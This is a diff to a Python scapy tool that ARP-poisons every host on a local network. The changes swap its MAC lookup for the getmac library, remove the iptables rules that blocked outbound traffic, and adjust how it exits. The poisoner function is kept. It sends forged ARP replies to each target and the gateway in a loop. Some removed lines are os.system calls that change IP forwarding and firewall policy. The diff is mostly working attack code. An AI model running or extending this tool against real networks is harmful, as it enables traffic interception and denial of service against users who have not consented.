@@ -15,6 +15,7 @@
 
 from scapy.all import *
 from time import sleep
+from getmac import get_mac_address
 import sys, os, argparse, subprocess, csv
 from multiprocessing import Pool
 
@@ -93,15 +94,6 @@ def ping(ip):
 
 
 #####################################################################################
-# Convert ip to a mac address,
-def get_mac_address(ip, interface):
-    conf.verb = 0
-    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
-    for snd, rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
-
-
-#####################################################################################
 # Basically just a network scanner
 def ip_parser(ap_ip, interface):
     ip_list = []
@@ -144,78 +136,47 @@ def csv_parser(csvf):
         sys.exit(0)
     return ip_list
 
-
-# (Deprecated) ReARP leftovers, doesn't work and do anything so i removed it.
-'''def reARP(target_ip, ap_ip):
-    if silent == False:
-        print(f"Restoring {target_ip}...")
-    try:
-        send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7) 
-        send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = ap_mac), count = 7)
-        if silent == False:
-            print(GREEN + "Restored Successfully!" + NONE)
-    except:
-        if silent == False:
-            print(ERR + f"Unable to send ARP to {target_ip}" + NONE)'''
         
 #####################################################################################
 # Just a simple function handling program exiting
 def exit_handler(interface, ap_ip):
-    if useMultiprocessing is True:
-        if silent is False:
-            print("Closing the multiprocesses pool...")
-        pool.close()
-        if silent is False:
-            print(f"{GREEN}Success!{NONE}")
-    if silent is False:
-        print("Disabling IP forwarding...")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    if silent is False:
-        print(GREEN + "Done!" + NONE)
-        print("Unlocking entire outbound traffic...")
-    os.system("iptables -P FORWARD ACCEPT")
-    os.system("iptables -P OUTPUT ACCEPT")
-    if silent is False:
-        print(GREEN + "Done!" + NONE)
-        print(ERR + "Exiting..." + NONE)
-    sys.exit(1)
-'''    if silent == False:
-        print(GREEN + "Done!" + NONE)
-        print("Restoring targets...")
     try:
-        for target_ip in ip_list:
-            reARP(target_ip, ap_ip)
-            if silent == False:
-                print(GREEN + f"Restored {target_ip}" + NONE)
+        if useMultiprocessing is True:
+            if silent is False:
+                print("Closing the multiprocesses pool...")
+            pool.close()
+            if silent is False:
+                print(GREEN + "Done!" + NONE)
+        if silent is False:
+            print(ERR + "Exiting..." + NONE)
+        sys.exit(1)
     except KeyboardInterrupt:
-        if silent == False:
-            print(ERR + "User Interruption, halting..." + NONE)'''  # (Deprecated
+        print(ERR + "Please do not interrupt the exiting process!" + NONE)
 
 
 #####################################################################################
 # Poisoning Function
 def poisoner(ip_list, interface, delay):
     for target_ip in ip_list:
-        target_mac = get_mac_address(target_ip, interface)
+        print(str(target_ip))
+        target_mac = get_mac_address(ip=str(target_ip))
         try:
             send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst= target_mac))
             send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst= ap_mac))
             if silent is False:
                 print(GREEN + f"Poisoned {target_ip}" + NONE)
-        except:
+        except Exception as error:
             if silent is False:
                 print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
+                #return { 'error': error }
         sleep(delay)
 
 
 #####################################################################################
 # Function wrapping eveything up.
-def proxier(ap_ip, interface, delay):
+def proxier(ap_ip, interface, delay, cycles, useCycles, pool):
     try:
-        global cycles
-        global useCycles
-        global pool
-        ap_mac = get_mac_address(ap_ip, interface)
+        ap_mac = get_mac_address(ip=ap_ip)
         if csvf:
             if silent is False:
                 if logoinvis is False:
@@ -230,11 +191,7 @@ def proxier(ap_ip, interface, delay):
             ip_list = ip_parser(ap_ip, interface)
         if silent is False:
             print(GREEN + "\nDone!" + NONE)
-            print("Blocking entire outbound traffic...")
-        os.system("iptables -P FORWARD DROP")
-        os.system("iptables -P OUTPUT DROP")
         if silent is False:
-            print(GREEN + "Done!" + NONE)
             print("Starting to Poison the Network...")
         if useCycles is False:
             while 1 < 2:
@@ -293,7 +250,7 @@ def main():
     if args.cycles:
         useCycles = True
         cycles = args.cycles
-    proxier(ap_ip, interface, delay)
+    proxier(ap_ip, interface, delay, cycles, useCycles, pool)
 
 
 if __name__ == '__main__':
